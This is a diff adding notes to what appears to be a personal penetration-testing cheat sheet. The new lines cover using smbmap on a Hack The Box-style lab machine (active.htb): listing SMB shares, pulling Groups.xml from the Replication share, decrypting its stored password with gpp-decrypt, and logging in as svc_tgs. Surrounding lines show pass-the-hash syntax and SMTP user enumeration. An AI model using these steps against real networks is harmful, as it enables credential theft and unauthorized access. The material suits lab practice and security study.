@@ -333,7 +333,22 @@ smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive
 smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
 smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
 
+SMBMAP
+Smbmap -H 10.10.10.100 list all the file shares and what permissions we have 
 
+Smbmap -F will help you search for strings in files
+Smbmap -R searches through every directory 
+
+will list the files in the replication share 
+Smbmap -R Replication -H 10.10.10.100 
+
+This command will download group xml and do it in quite mode because of the -q parameter 
+Smbmap -R replication -H 10.10.10.100 -A Groups.xml -q. 
+
+
+The command gpp-decrypt helps decrypt strings 
+With smbclient mget* downloads every file
+Smbmap -d active.htb -u svc_tgs -p password -H 10.10.10.100 - this command will log in with the username and password specified 
 
 ----------------------------------------------------- SMTP -------------------------------------------------------------------
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
